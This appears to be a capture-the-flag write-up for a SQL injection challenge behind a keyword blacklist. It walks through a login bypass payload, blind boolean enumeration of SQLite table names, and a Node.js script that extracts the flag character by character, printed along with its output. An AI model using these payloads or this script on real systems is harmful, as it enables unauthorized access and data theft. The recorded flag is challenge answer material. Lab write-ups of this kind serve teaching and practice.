**Name**: Blacklist Reloaded  
**Points**: 600  
**Instructions**: Maybe I'm foolish, maybe I'm blind, thinking I can see through this and see what's behind! Can you get the flag from http://challenges.runesec.com:15123 ?  
**Hint**: Can you leak out any information? You might like it :)  

## Exploration
- We know this is another challenge of SQL injection with a blacklist.  

- We are given a login interface with Username and Password fields. We assume the following query - more or less - is invoked on the login server:  
`SELECT * FROM ??? WHERE username="{sqli input}" AND password="{sqli input}"`  

- We can start by finding what's in the blacklist and what we can actually use.  
*(If a blacklisted term is found in the input, a special page is returned saying that a blacklisted term was used.)*  
Some of the blacklisted semantics: `', ;, =, UNION`  
Some of the semantics we can use: `", OR, AND, EXISTS, SELECT, WHERE, LIKE, %, /*, --`

## Exploitation
We start pretty simple:  
`" OR 1 /*`
- `"` to validly close the opened quotes that expect to contain the username.
- `OR 1` because ORing something TRUE, makes the whole expression to evaluate as TRUE.
- `/*` is a multi-line comment to escape anything that comes after our crafted query and avoid errors.  

This works, kinda. We go through the login wall successfully, but the page we land reads:  
`Well done, but the flag is not here`

This will prove helpful. We know whatever statement we put after `OR`, will be true only if we land on this page, otherwise we'll get to a page that reads `Login failed`.

### Finding table names:
From https://www.sqlite.org/faq.html:
```
Every SQLite database has an SQLITE_MASTER table that defines the schema for the database.  
The SQLITE_MASTER table looks like this:

CREATE TABLE sqlite_master (
  type TEXT,
  name TEXT,
  tbl_name TEXT,
  rootpage INTEGER,
  sql TEXT
);
For tables, the type field will always be 'table' and the name field will be the name of the table.
```
We can start discovering table names as follows:  
`" OR EXISTS(SELECT * FROM SQLITE_MASTER WHERE type LIKE "table" AND name LIKE "a%") /*` FAIL  
`" OR EXISTS(SELECT * FROM SQLITE_MASTER WHERE type LIKE "table" AND name LIKE "b%") /*` FAIL  
`" OR EXISTS(SELECT * FROM SQLITE_MASTER WHERE type LIKE "table" AND name LIKE "c%") /*` FAIL  
`" OR EXISTS(SELECT * FROM SQLITE_MASTER WHERE type LIKE "table" AND name LIKE "d%") /*` FAIL  
`" OR EXISTS(SELECT * FROM SQLITE_MASTER WHERE type LIKE "table" AND name LIKE "e%") /*` FAIL  
`" OR EXISTS(SELECT * FROM SQLITE_MASTER WHERE type LIKE "table" AND name LIKE "f%") /*` SUCCESS  
Great! We now know there's a table that starts with the letter `f`.  
`" OR EXISTS(SELECT * FROM SQLITE_MASTER WHERE type LIKE "table" AND name LIKE "fa%") /*` FAIL  
`" OR EXISTS(SELECT * FROM SQLITE_MASTER WHERE type LIKE "table" AND name LIKE "fb%") /*` FAIL  
...  
`" OR EXISTS(SELECT * FROM SQLITE_MASTER WHERE type LIKE "table" AND name LIKE "fl%") /*` SUCCESS   
Great! We now know there's a table that starts with `fl`.  

Repeating the process, for the rest of the table name we discover a table named `flagHERE`.  
*(We can figure out when we've discovered the full table name when we exhaust all the possible characters to be appended to the current discovered name, but they all fail)*

We guess there's a column named `flag` in table `flagHERE` and we can use the same methodology as above to discover the flag, one character at a time.

## Solution 
```
var axios = require('axios');

var URL         = 'http://challenges.runesec.com:15123/login.php';
var LEN_FLAG    = 32 + 4 + 2;
var SUCCESS_MSG = 'Well done, but the flag is not here'

var d = ('0123456789abcdef' + 'lg{}').split('');

var step = function(i, c, flag) {
    if (i >= LEN_FLAG) return;
    if (c >= d.length) return;
    var fflag = flag + d[c];
    var query = '" OR EXISTS(SELECT flag FROM flagHERE WHERE flag LIKE "' + fflag + '%") /*';
    axios.post(URL, 'username=' + query, { headers: {'Content-Type': 'application/x-www-form-urlencoded' }})
    .then(function(res) {
      var success = res.data.indexOf(SUCCESS_MSG) !== -1;
      if (success) {
        console.log(fflag);
        step(i + 1, 0, fflag);
      } else {
        step(i, c + 1, flag);
      }
    });
}
step(0, 0, '');
```
Output:
```
f
fl
fla
flag
flag{
flag{c
flag{c6
flag{c6a
flag{c6a7
flag{c6a7e
flag{c6a7ee
flag{c6a7eee
flag{c6a7eee6
flag{c6a7eee68
flag{c6a7eee68d
flag{c6a7eee68d1
flag{c6a7eee68d18
flag{c6a7eee68d185
flag{c6a7eee68d1851
flag{c6a7eee68d18518
flag{c6a7eee68d185186
flag{c6a7eee68d1851866
flag{c6a7eee68d18518663
flag{c6a7eee68d18518663b
flag{c6a7eee68d18518663b7
flag{c6a7eee68d18518663b76
flag{c6a7eee68d18518663b76d
flag{c6a7eee68d18518663b76da
flag{c6a7eee68d18518663b76dab
flag{c6a7eee68d18518663b76dab1
flag{c6a7eee68d18518663b76dab17
flag{c6a7eee68d18518663b76dab17f
flag{c6a7eee68d18518663b76dab17f9
flag{c6a7eee68d18518663b76dab17f99
flag{c6a7eee68d18518663b76dab17f990
flag{c6a7eee68d18518663b76dab17f990a
flag{c6a7eee68d18518663b76dab17f990a5
flag{c6a7eee68d18518663b76dab17f990a5}
```
